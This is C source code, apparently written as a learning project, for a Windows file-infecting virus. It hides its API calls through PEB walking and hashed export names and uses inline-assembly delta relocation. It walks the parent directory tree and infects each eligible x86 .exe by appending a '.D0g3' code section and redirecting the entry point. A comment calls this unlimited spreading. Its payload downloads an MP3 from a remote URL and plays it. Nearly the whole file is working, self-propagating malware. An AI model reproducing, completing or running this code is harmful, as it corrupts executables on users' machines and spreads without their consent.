#define _CRT_SECURE_NO_WARNINGS
 
#include "1.h"

#define MakePointer(t, p, offset) ((t)((PBYTE)(p) + offset))
#define R(x) ((t##x)((ULONG_PTR)x+(ULONG_PTR)dif))
#define M(x,y) ((x)(y))

DWORD   __stdcall   dqx_memcmp(char* x, char* y, int len);
void    __stdcall   dqx_memcpy(char* x, char* y, int len);
DWORD   __stdcall   dqx_strlen(char* X);
void    __stdcall   dqx_strcat(char* x, char* y);
PVOID   __stdcall   dqx_strfind(char* x, char y);
DWORD	__stdcall	dqx_Align(DWORD dwSize, DWORD dwAlign);
VOID   __stdcall	dqx_PatchPe(PVOID f_Name);
PVOID   __stdcall   dqx_getD0g3Section();
DWORD   __stdcall   dqx_CheckFIle(PVOID f_Name);
void    __stdcall   dqx_SearchFile();
void    __stdcall   dqx_Music();
void    __stdcall   dqx_FrameWork(char* directory);
HMODULE __stdcall   dqx_GetModuleHandle(WCHAR* lpName);
FARPROC __stdcall   dqx_GetProcAddress(HMODULE hModule, DWORD API_hash);
int     __stdcall   dqx_strcmpA(const char* psza, const char* pszb);
int     __stdcall   dqx_stricmpW(const wchar_t* pwsza, const wchar_t* pwszb);


enum {
	ID_OEP,
	ID_NEP,
	ID_LoadLibraryA,
	ID_GetModuleHandleA,
	ID_FreeLibrary,
	ID_CreateFileA,
	ID_CloseHandle,
	ID_GetCurrentDirectoryA,
	ID_ReadFile,
	ID_WriteFile,
	ID_DeleteFileA,
	ID_SetFilePointer,
	ID_GetFileSize,
	ID_FindFirstFileA,
	ID_FindNextFileA,
	ID_FindClose,
	ID_GlobalAlloc,
	ID_GlobalFree,
	ID_Sleep,
	ID_URLDownloadToFileA,
	ID_mciSendStringA,

};
#pragma code_seg(".D0g3") 
__declspec(allocate(".D0g3")) __declspec(selectany)  ULONG_PTR gArr[ID_mciSendStringA + 1];
/*循环右移*/
DWORD	__stdcall	fROR(DWORD data, int length)
{
	DWORD result = 0;
	result = (data >> length) | (data << (32 - length));
	return result;
}
int     __stdcall   dqx_strcmpA(const char* psza, const char* pszb) {
	unsigned char c1 = 0;
	unsigned char c2 = 0;

	do {
		c1 = (unsigned char)*psza++;
		c2 = (unsigned char)*pszb++;
		if (c1 == 0)
			return c1 - c2;
	} while (c1 == c2);

	return c1 - c2;
}
int     __stdcall   dqx_stricmpW(const wchar_t* pwsza, const wchar_t* pwszb) {
	unsigned short c1 = 0;
	unsigned short c2 = 0;

	do {
		c1 = (unsigned short)*pwsza++;
		if (c1 >= 65 && c1 <= 90) {
			c1 = c1 + 32;
		}

		c2 = (unsigned short)*pwszb++;
		if (c2 > 65 && c2 < 90) {
			c2 = c2 + 32;
		}

		if (c1 == 0)
			return c1 - c2;
	} while (c1 == c2);

	return c1 - c2;
}
DWORD   __stdcall   dqx_memcmp(char* x, char* y, int len)
{
	int  i;
	for (i = 0; i < len; i++)
	{
		if (x[i] > y[i])
		{
			return 1;
		}
		else if (x[i] < y[i])
		{
			return -1;
		}
	}
	return 0;
}
void    __stdcall   dqx_memcpy(char* x, char* y, int len)
{
	int i;
	for (i = 0; i < len; i++)
	{
		x[i] = y[i];
	}
	x[i] = 0;
}
DWORD   __stdcall   dqx_strlen(char* X)
{
	int i = 0;
	while (1)
	{
		if (X[i])
		{
			i++;
		}
		else
		{
			break;
		}
	}
	return i;
}
void    __stdcall   dqx_strcat(char* x, char* y)
{
	int i;


	int lenx = dqx_strlen(x);
	int leny = dqx_strlen(y);
	for (i = 0; i < leny; i++)
	{
		x[lenx + i] = y[i];
	}
	x[lenx + i] = 0;
	return;
}
PVOID   __stdcall   dqx_strfind(char* x, char y)//应该返回组后一次出现的位置
{
	int  i;

	int len = dqx_strlen(x);
	PVOID xx = 0;
	for (i = 0; i < len; i++)
	{
		if (x[i] == y)
		{
			xx = &x[i];
		}
	}
	if (xx)
	{
		return xx;
	}
	return 0;
}
DWORD   __stdcall   dqx_Align(DWORD dwSize, DWORD dwAlign)//根据对齐粒度,去返回真实长度
{
	int tmp1 = dwSize / dwAlign;
	int mod1 = dwSize % dwAlign;
	if (mod1)//如果存在
	{
		return (tmp1 + 1) * dwAlign;
	}
	else
	{
		return dwSize;
	}
}
HMODULE __stdcall   dqx_GetModuleHandle(WCHAR* lpName)
{
	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR Buffer;
	} UNICODE_STRING;
	typedef UNICODE_STRING* PUNICODE_STRING;
	typedef const UNICODE_STRING* PCUNICODE_STRING;

	typedef struct _LDR_DATA_TABLE_ENTRY
	{
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID BaseAddress;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		SHORT LoadCount;
		SHORT TlsIndex;
		LIST_ENTRY HashTableEntry;
		ULONG TimeDateStamp;
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		PVOID SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

#ifdef _WIN64
	typedef struct _PEB {
		BYTE Reserved1[2];
		BYTE BeingDebugged;
		BYTE Reserved2[21];
		PPEB_LDR_DATA Ldr;
		PVOID ProcessParameters;
		BYTE Reserved3[520];
		PVOID PostProcessInitRoutine;
		BYTE Reserved4[136];
		ULONG SessionId;
	} PEB, * PPEB;
#else
	typedef struct _PEB {
		BYTE Reserved1[2];
		BYTE BeingDebugged;
		BYTE Reserved2[1];
		PVOID Reserved3[2];
		PPEB_LDR_DATA Ldr;
		LPVOID ProcessParameters;
		PVOID Reserved4[3];
		PVOID AtlThunkSListPtr;
		PVOID Reserved5;
		ULONG Reserved6;
		PVOID Reserved7;
		ULONG Reserved8;
		ULONG AtlThunkSListPtr32;
		PVOID Reserved9[45];
		BYTE Reserved10[96];
		LPVOID PostProcessInitRoutine;
		BYTE Reserved11[128];
		PVOID Reserved12[1];
		ULONG SessionId;
	} PEB, * PPEB;
#endif
	// Get the base address of PEB struct
#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
	if (pPeb && pPeb->Ldr) {
		PPEB_LDR_DATA pLdr = pPeb->Ldr;

		// And get header of the InLoadOrderModuleList
		PLIST_ENTRY pHeaderOfModuleList = &(pLdr->InLoadOrderModuleList);
		if (pHeaderOfModuleList->Flink != pHeaderOfModuleList)
		{
			PLDR_DATA_TABLE_ENTRY pEntry = NULL;
			PLIST_ENTRY pCur = pHeaderOfModuleList->Flink;
			do
			{
				pEntry = CONTAINING_RECORD(pCur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
				if (0 == dqx_stricmpW(pEntry->BaseDllName.Buffer, lpName))
				{
					return pEntry->BaseAddress;
					break;
				}
				pEntry = NULL;
				pCur = pCur->Flink;
			} while (pCur != pHeaderOfModuleList);
		}
	}
	return NULL;
}
FARPROC __stdcall   dqx_GetProcAddress(HMODULE hModule,DWORD API_hash)
{
	BYTE* lpName;
	DWORD  hash_tmp;
	BYTE btmp;
	if (!hModule)
		return NULL;

	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)hModule;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS pImageNTHeaders = MakePointer(PIMAGE_NT_HEADERS, hModule, pImageDosHeader->e_lfanew);
	if (pImageNTHeaders->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	if (pImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
		return NULL;

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = MakePointer(
		PIMAGE_EXPORT_DIRECTORY,
		hModule,
		pImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
	);

	PDWORD pNameTable = MakePointer(PDWORD, hModule, pImageExportDirectory->AddressOfNames);

	for (DWORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) 
	{
		hash_tmp = 0;
		lpName = (char*)hModule + pNameTable[i];
		for (i = 0; lpName[i]; i++) {
			btmp = lpName[i];
			if (btmp >= 'A' && btmp <= 'Z') {
				btmp = btmp | 0b100000; //我希望在这里来一个大小写的统一
			}
			hash_tmp = btmp + fROR(hash_tmp, 17);
		}
		if (hash_tmp == API_hash)
		{
			PWORD pOrdinalTable = MakePointer(PWORD, hModule, pImageExportDirectory->AddressOfNameOrdinals);
			PDWORD pAddressTable = MakePointer(PDWORD, hModule, pImageExportDirectory->AddressOfFunctions);
			DWORD dwAddressOffset = pAddressTable[pOrdinalTable[i]];
			return MakePointer(PVOID, hModule, dwAddressOffset);
		}
	}
	return NULL;
}
PVOID   __stdcall   dqx_getD0g3Section()
{
	ULONG_PTR dif;
	ULONG_PTR* lp_gArr;
	__asm {
		push ebx;
		call label_reloc;
	label_reloc:
		pop ebx;
		sub ebx, label_reloc;
		mov dif, ebx;
		pop ebx;
	}
	lp_gArr = (BYTE*)gArr + dif;
	char tagSec[] = { '.','D','0','g','3',0 };
	IMAGE_DOS_HEADER* dos_header = M(tAPI_GetModuleHandleA,lp_gArr[ID_GetModuleHandleA])(0);
	IMAGE_NT_HEADERS* nt_header = (ULONG_PTR)dos_header + dos_header->e_lfanew;
	IMAGE_SECTION_HEADER* lp_Sec = (ULONG_PTR)nt_header + sizeof(IMAGE_NT_HEADERS);
	int secCnt = nt_header->FileHeader.NumberOfSections;
	int i, secLen;
	char* lp;
	PVOID headpRet;

	for (i = 0; i < secCnt; i++)
	{
	    if (!R(dqx_memcmp)(lp_Sec->Name, tagSec, 5))
	    {
	        break;
	    }
	    lp_Sec = (ULONG_PTR)lp_Sec + sizeof(IMAGE_SECTION_HEADER);
	}
	if (i == secCnt)
	{
	    return NULL;//有问题
	}
	if (lp_gArr[ID_NEP] > lp_Sec->VirtualAddress)//本来是一个多余的操作的
	{
		lp_gArr[ID_NEP] = lp_gArr[ID_NEP] - lp_Sec->VirtualAddress; 
	}
	secLen = lp_Sec->SizeOfRawData;
	headpRet = M(tAPI_GlobalAlloc, lp_gArr[ID_GlobalAlloc])(GPTR, secLen + 4);

	if (headpRet)
	{
	    *((DWORD*)headpRet) = lp_Sec->SizeOfRawData;
	    lp = (ULONG_PTR)headpRet + 4;
		R(dqx_memcpy)(lp, lp_Sec->VirtualAddress + (ULONG_PTR)dos_header, lp_Sec->SizeOfRawData);
	    return  headpRet;
	}
	else
	{
		return 0;
	}
}
VOID	__stdcall   dqx_PatchPe(PVOID f_Name) //我在检测别人的同时,自己就已经被感染了,所以直接拷贝字节的D0g3节区到别人的最后oui一个节区中,然后把ip指向我们的start
{

	HANDLE hFile;
	PVOID lpMemory, pNewSec;
	DWORD fTemp0, dwFileSize, dwtmp;
	IMAGE_DOS_HEADER* dos_header;
	IMAGE_NT_HEADERS* nt_header;
	IMAGE_SECTION_HEADER* lp_hsec_extend;
	IMAGE_SECTION_HEADER* lp_hsec_last;
	int secCnt;
	char tagSec[8] = { '.','D', '0', 'g', '3', '\0' };

	ULONG_PTR dif;
	ULONG_PTR* lp_gArr;
	__asm {
		push ebx;
		call label_reloc;
	label_reloc:
		pop ebx;
		sub ebx, label_reloc;
		mov dif, ebx;
		pop ebx;
	}
	lp_gArr = (ULONG_PTR)gArr + dif;

	PVOID dataD0g3 = R(dqx_getD0g3Section)();
	if (dataD0g3 == NULL)
	{
		return;
	}
	DWORD lenD0g3 = *((DWORD*)dataD0g3);
	dataD0g3 = (ULONG_PTR)dataD0g3 + 4;


	hFile = M(tAPI_CreateFileA, lp_gArr[ID_CreateFileA])(
		f_Name, 
		GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, 
		OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		goto _cfh;
	}
	dwFileSize = M(tAPI_GetFileSize, lp_gArr[ID_GetFileSize])(hFile, NULL);
	if (dwFileSize == 0)
	{
		goto _cfh;
	}
	lpMemory = M(tAPI_GlobalAlloc, lp_gArr[ID_GlobalAlloc])(GPTR, dwFileSize);
	if (lpMemory == 0)
	{
		goto _cfh;
	}
	M(tAPI_ReadFile, lp_gArr[ID_ReadFile])(
		hFile, lpMemory, 
		dwFileSize, &fTemp0, NULL);

	dos_header = lpMemory;
	nt_header = dos_header->e_lfanew + (BYTE*)lpMemory;
	secCnt = nt_header->FileHeader.NumberOfSections;
	lp_hsec_last = (BYTE*)nt_header + sizeof(IMAGE_NT_HEADERS)+(secCnt - 1) * sizeof(IMAGE_SECTION_HEADER);
	lp_hsec_extend = (BYTE*)lp_hsec_last + sizeof(IMAGE_SECTION_HEADER);

	
	R(dqx_memcpy)(lp_hsec_extend->Name, tagSec, 5);
	dwtmp = dqx_Align(lenD0g3, nt_header->OptionalHeader.FileAlignment);
	lp_hsec_extend->PointerToRawData = dwFileSize;//直接说最后一个节区获取数据了
	lp_hsec_extend->SizeOfRawData = dwtmp;
	lp_hsec_extend->VirtualAddress = nt_header->OptionalHeader.SizeOfImage;
	lp_hsec_extend->Misc.VirtualSize = lenD0g3;
	lp_hsec_extend->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;

	dwtmp = dqx_Align(lenD0g3, nt_header->OptionalHeader.SectionAlignment);
	nt_header->FileHeader.NumberOfSections++;
	nt_header->OptionalHeader.SizeOfCode += dwtmp;
	nt_header->OptionalHeader.SizeOfImage += dwtmp;



	//备份别人的ep,然后修改ep,是一个RVA ,蠕虫在运行的时候,还要继续修改的
	lp_gArr[ID_OEP]= nt_header->OptionalHeader.AddressOfEntryPoint;
	nt_header->OptionalHeader.AddressOfEntryPoint = lp_gArr[ID_NEP] + lp_hsec_extend->VirtualAddress;


	M(tAPI_SetFilePointer, lp_gArr[ID_SetFilePointer])(hFile, 0, NULL, FILE_BEGIN);
	M(tAPI_WriteFile,lp_gArr[ID_WriteFile])(hFile, lpMemory, dwFileSize, &fTemp0, NULL);//以前的东西
 
	pNewSec = M(tAPI_GlobalAlloc, lp_gArr[ID_GlobalAlloc])(GPTR, lp_hsec_extend->SizeOfRawData);
	R(dqx_memcpy)(pNewSec, dataD0g3, lenD0g3);
	M(tAPI_SetFilePointer, lp_gArr[ID_SetFilePointer])(hFile, 0, NULL, FILE_END);
	M(tAPI_WriteFile, lp_gArr[ID_WriteFile])(hFile, pNewSec, lp_hsec_extend->SizeOfRawData, &fTemp0, NULL);
	M(tAPI_GlobalFree, lp_gArr[ID_GlobalFree])(pNewSec);

_cmh:
	M(tAPI_GlobalFree, lp_gArr[ID_GlobalFree])(lpMemory);
_cfh:
	dataD0g3 = (ULONG_PTR)dataD0g3 - 4;
	M(tAPI_GlobalFree, lp_gArr[ID_GlobalFree])(dataD0g3);
	M(tAPI_CloseHandle, lp_gArr[ID_CloseHandle])(hFile);
Exit0:
	return ;
}
DWORD   __stdcall   dqx_CheckFIle(PVOID f_Name)
{

	
	HANDLE hFile;
	PVOID	 pMemory;
	DWORD  hLen, temp, nSec,dwRet;
	IMAGE_DOS_HEADER dos_header;
	IMAGE_NT_HEADERS nt_header;
	IMAGE_SECTION_HEADER* lp_hsec_last;
	IMAGE_SECTION_HEADER* lp_Sec;
	char tagSec[] = { '.','D', '0', 'g', '3', '\0' };
	ULONG_PTR dif;
	ULONG_PTR* lp_gArr;
	__asm {
		push ebx;
		call label_reloc;
	label_reloc:
		pop ebx;
		sub ebx, label_reloc;
		mov dif, ebx;
		pop ebx;
	}
	lp_gArr = (ULONG_PTR)gArr + dif;

 

	hFile = M(tAPI_CreateFileA,lp_gArr[ID_CreateFileA])(
		f_Name,
		GENERIC_READ | GENERIC_WRITE, 0, NULL,
		OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		dwRet = 0;
		goto _nth_ret;
	}
	hLen = M(tAPI_GetFileSize,lp_gArr[ID_GetFileSize])(hFile, &temp);
	M(tAPI_ReadFile,lp_gArr[ID_ReadFile])(
		hFile, 
		&dos_header, 
		sizeof(IMAGE_DOS_HEADER), &temp, NULL);
	if (dos_header.e_magic != 0x5A4D)
	{
		dwRet = 0;
		goto _cFh;
	}
	M(tAPI_SetFilePointer,lp_gArr[ID_SetFilePointer])(hFile, dos_header.e_lfanew, NULL, FILE_BEGIN);
	M(tAPI_ReadFile, lp_gArr[ID_ReadFile])(hFile, &nt_header, sizeof(IMAGE_NT_HEADERS), &temp, NULL);
	if (nt_header.Signature != 0x4550 || nt_header.FileHeader.Machine != 0x014C)//得是x86的
	{
		dwRet = 0;
		goto _cFh;
	}
	pMemory = M(tAPI_GlobalAlloc, lp_gArr[ID_GlobalAlloc])(GPTR, hLen);
	if (pMemory == NULL)
	{
		dwRet = 0;
		goto _cFh;
	}
	M(tAPI_SetFilePointer, lp_gArr[ID_SetFilePointer])(hFile, 0, NULL, FILE_BEGIN);
	M(tAPI_ReadFile, lp_gArr[ID_ReadFile])(hFile, pMemory, hLen, &temp, NULL);


	nSec = nt_header.FileHeader.NumberOfSections;
	lp_Sec = (BYTE*)pMemory + sizeof(IMAGE_NT_HEADERS)+dos_header.e_lfanew;
	lp_hsec_last = (BYTE*)lp_Sec + (nSec - 1) * (sizeof(IMAGE_SECTION_HEADER));//最后一个节区

	 
	if (!R(dqx_memcmp)(lp_hsec_last->Name, tagSec, 5))//最后一个节区,而不是附加一个截取
	{
		dwRet = 0;
		goto _cMh;
	}
	//没被感染,可不可以新追加一个节区表
	while (!lp_Sec->PointerToRawData) 
	{
		lp_Sec = (BYTE*)lp_Sec + sizeof(IMAGE_SECTION_HEADER);
	}

	//lp_hsec_last是最后一个
	//lp_Sec是准备附加的那个

	if (((ULONG_PTR)lp_hsec_last + 2 * sizeof(IMAGE_SECTION_HEADER) - (ULONG_PTR)pMemory) > lp_Sec->PointerToRawData)//附加节区的结束位置的 > 第一个节区
	{
		dwRet = 1;
	}
	else {
		dwRet = 0;
	}
_cMh:
	M(tAPI_GlobalFree,lp_gArr[ID_GlobalFree])(pMemory);
_cFh:
	M(tAPI_CloseHandle, lp_gArr[ID_CloseHandle])(hFile);
_nth_ret:
	return dwRet;
}
void    __stdcall   dqx_FrameWork(char* directory)
{
	char searchPath[MAX_PATH];
	char subDirPath[MAX_PATH];
	char filePath[MAX_PATH];
	WIN32_FIND_DATAA fileInfo;
	HANDLE hFind;
	char* extension;
	char exp1[] = { '.', 'e', 'x', 'e', '\0' };
	char exp2[8] = { '\\', '*', '.', '*', '\0' };
	char exp3[8] = { '.', '.', '\\', '\0' };

	ULONG_PTR dif;
	ULONG_PTR* lp_gArr;
	__asm {
		push ebx;
		call label_reloc;
	label_reloc:
		pop ebx;
		sub ebx, label_reloc;
		mov dif, ebx;
		pop ebx;
	}
	lp_gArr = (ULONG_PTR)gArr + dif;



	R(dqx_memcpy)(searchPath, directory, R(dqx_strlen)(directory));
	R(dqx_strcat)(searchPath, exp2);
	hFind = M(tAPI_FindFirstFileA,lp_gArr[ID_FindFirstFileA])(searchPath, &fileInfo);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (!(fileInfo.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))//如果是文件
			{
				// 检查文件扩展名是否为exe
				extension = R(dqx_strfind)(fileInfo.cFileName, '.');//寻找点的位置
				if (extension != NULL && R(dqx_memcmp)(extension, exp1, 5) == 0)
				{
					R(dqx_memcpy)(filePath, directory, R(dqx_strlen)(directory));
					R(dqx_strcat)(filePath, &exp3[2]);
					R(dqx_strcat)(filePath, fileInfo.cFileName);
					if (R(dqx_CheckFIle)(filePath) == 1)
					{
						R(dqx_PatchPe)(filePath);//无线传播
					}
				}
			}
			else if (R(dqx_memcmp)(fileInfo.cFileName, exp3, 1) != 0 && R(dqx_memcmp)(fileInfo.cFileName, exp3, 2) != 0)//如果是目录
			{
				R(dqx_memcpy)(subDirPath, directory, R(dqx_strlen)(directory));
				R(dqx_strcat)(subDirPath, &exp3[2]);
				R(dqx_strcat)(subDirPath, fileInfo.cFileName);
				R(dqx_FrameWork)(subDirPath); // 递归遍历子目录
			}
			
		} while (M(tAPI_FindNextFileA, lp_gArr[ID_FindNextFileA])(hFind, &fileInfo));
		M(tAPI_FindClose, lp_gArr[ID_FindClose])(hFind);
	}
}
void    __stdcall   dqx_SearchFile()
{
	int i;
	int len;
	int cnt = 0;
	char currentDir[MAX_PATH];

 
	ULONG_PTR dif;
	ULONG_PTR* lp_gArr;
	__asm {
		push ebx;
		call label_reloc;
	label_reloc:
		pop ebx;
		sub ebx, label_reloc;
		mov dif, ebx;
		pop ebx;
	}
	lp_gArr = (ULONG_PTR)gArr + dif;

 
	M(tAPI_GetCurrentDirectoryA,lp_gArr[ID_GetCurrentDirectoryA])(MAX_PATH, currentDir);
	len = R(dqx_strlen)(currentDir);

	for (i = len;; i--)//来到上一级目录
	{
		if (currentDir[i] == '\\' || i == 0)
		{
			currentDir[i] = 0;
			break;
		}
		currentDir[i] = 0;
	}
	R(dqx_FrameWork)(currentDir); //主要的工作函数
	return;
}
void	__stdcall	dqx_InitImport() {
 
	int i;
	
	
	ULONG_PTR dif;
	ULONG_PTR* lp_gArr;
	__asm {
		push ebx;
		call label_reloc;
	label_reloc:
		pop ebx;
		sub ebx, label_reloc;
		mov dif, ebx;
		pop ebx;
	}
	lp_gArr = (ULONG_PTR)gArr + dif;

	DWORD hashArr[] = {
		0xC40CC686,
		0x0DA71F53,
		0x8ECB8B99,
		0xAE03C384,
		0x2C081C86,
		0xC2E2E107,
		0x1446AC87,
		0xAB474487,
		0xB543C504,
		0xDC14C92F,
		0xC20FBF07,
		0xB4D46874,
		0xD02449A4,
		0x0E4AF289,
		0x1D095A86,
		0x34435A0A,
		0x70400090,

	};
	WCHAR szKerne32[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
	HMODULE hk32 = R(dqx_GetModuleHandle)(szKerne32);
	if (hk32 == NULL) {
		return;
	}
	
	for (i = 0; i < ID_Sleep - ID_LoadLibraryA + 1; i++)
	{
		lp_gArr[ID_LoadLibraryA + i] = R(dqx_GetProcAddress)(hk32, hashArr[i]);
	}
}
void    __stdcall   dqx_Music()
{


	HMODULE hUrlmon;
	HMODULE hWinmm;
	HRESULT hr;


	ULONG_PTR dif;
	ULONG_PTR* lp_gArr;
	__asm {
		push ebx;
		call label_reloc;
	label_reloc:
		pop ebx;
		sub ebx, label_reloc;
		mov dif, ebx;
		pop ebx;
	}
	PVOID lpf_URLDownloadToFileA;
	PVOID lpf_mciSendStringA;

	char szUrlmon[] = { 'U', 'r', 'l', 'm', 'o', 'n', '.', 'd', 'l', 'l', 0 };
	char szWinmm[] = { 'W', 'i', 'n', 'm', 'm', '.', 'd', 'l', 'l', 0 };
 
	char urlDown[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'r', 'e', 'd', 'q', 'x', '.', 'g', 'i', 't', 'h', 'u', 'b', '.', 'i', 'o', '/', 'H', 'o', 'u', 's', 'e', '/', 'o', 't', 'h', 'e', 'r', '/', 'm', 'p', '3', '/', '2', '.', 'm', 'p', '3', '\0' };
	char path1[] = { 'C', ':', '/', 'U', 's', 'e', 'r', 's', '/', 'P', 'u', 'b', 'l', 'i', 'c', '/', 'D', 'o', 'w', 'n', 'l', 'o', 'a', 'd', 's', '/', 'r', 'q', '.', 'm', 'p', '3', '\0', };
	char cmd1[] = { 'o', 'p', 'e', 'n', ' ', 'C', ':', '/', 'U', 's', 'e', 'r', 's', '/', 'P', 'u', 'b', 'l', 'i', 'c', '/', 'D', 'o', 'w', 'n', 'l', 'o', 'a', 'd', 's', '/', 'r', 'q', '.', 'm', 'p', '3', ' ', 'a', 'l', 'i', 'a', 's', ' ', 'm', 'p', '3', '\0', };
	char cmd2[] = { 'p', 'l', 'a', 'y', ' ', 'm', 'p', '3', '\0', };
	
 



	hUrlmon = M(tAPI_LoadLibraryA, lp_gArr[ID_LoadLibraryA])(szUrlmon);
	if (!hUrlmon)
	{
		return;
	}
	
	hWinmm = M(tAPI_LoadLibraryA, lp_gArr[ID_LoadLibraryA])(szWinmm);
	if (!hWinmm)
	{
		goto _f1;
	}
	lpf_URLDownloadToFileA = R(dqx_GetProcAddress)(hUrlmon, 0x35B62A4F);
	lpf_mciSendStringA = R(dqx_GetProcAddress)(hWinmm, 0xFD354B8D);
	if (lpf_URLDownloadToFileA==NULL||  lpf_mciSendStringA == NULL) {
		goto _f2;
	}
	hr = ((tAPI_URLDownloadToFileA)lpf_URLDownloadToFileA)(0, urlDown, path1, 0, NULL);
	if (hr == S_OK)
	{
		((tAPI_mciSendStringA)lpf_mciSendStringA)(cmd1, 0, 0, 0);//音乐在当前目录下也可以写"open ./2.mp3"./这里可以省略
		((tAPI_mciSendStringA)lpf_mciSendStringA)(cmd2, 0, 0, 0);
		M(tAPI_Sleep, lp_gArr[ID_Sleep])(35 * 1000);
		M(tAPI_DeleteFileA, lp_gArr[ID_DeleteFileA])(path1);
	}
_f2:	
	M(tAPI_FreeLibrary, lp_gArr[ID_FreeLibrary])(hWinmm);
_f1:
	M(tAPI_FreeLibrary, lp_gArr[ID_FreeLibrary])(hUrlmon);
	return;
}
void    newEp()//naked裸函数，开辟和释放堆栈由我们自己写。这会是我们最后处理的时候,真正的entrypoint
{

	ULONG_PTR dif;
	ULONG_PTR* lp_gArr;
	__asm {
		push ebx;
		call label_reloc;
	label_reloc:
		pop ebx;
		sub ebx, label_reloc;
		mov dif, ebx;
		pop ebx;
	}
	PVOID myBase;
	R(dqx_InitImport)();
	R(dqx_SearchFile)();//他要获取别人的ep的
	R(dqx_Music)();

	myBase = M(tAPI_GetModuleHandleA, lp_gArr[ID_GetModuleHandleA])(0);
	__asm
	{
		mov eax, lp_gArr;
		add eax, 4;
		mov eax, [eax];//OEP
		add eax, myBase;//OEP+BASE
		//释放栈
		mov     esp, ebp;//不能释放堆栈,因为前面开辟了,还得继续用的
		pop     ebp;

		jmp eax;//nep
	}
}
#pragma code_seg()
#pragma comment(linker, "/SECTION:.D0g3,ERW")


int ma1n() // newEp() 
{
	gArr[1] = (ULONG_PTR)newEp - (ULONG_PTR)GetModuleHandleA(0);
	dqx_InitImport();
	dqx_SearchFile();
	return 0;
}